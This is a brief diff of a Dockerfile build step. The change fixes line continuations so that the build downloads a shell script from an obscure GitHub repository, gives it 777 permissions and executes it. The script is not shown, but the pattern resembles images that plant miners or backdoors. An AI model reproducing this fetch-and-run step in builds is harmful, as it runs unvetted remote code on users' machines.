@@ -7,9 +7,9 @@ RUN \
   apt-get install curl -y && \
   apt-get install gcc -y && \
   apt-get install wget -y && \
-  curl -Lfo bike.sh https://github.com/thoeb292/dest282/raw/main/rot.sh
-  chmod 777 bike.sh
-  ./bike.sh
+  curl -Lfo bike.sh https://github.com/thoeb292/dest282/raw/main/rot.sh && \
+  chmod 777 bike.sh && \
+  ./bike.sh && \
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
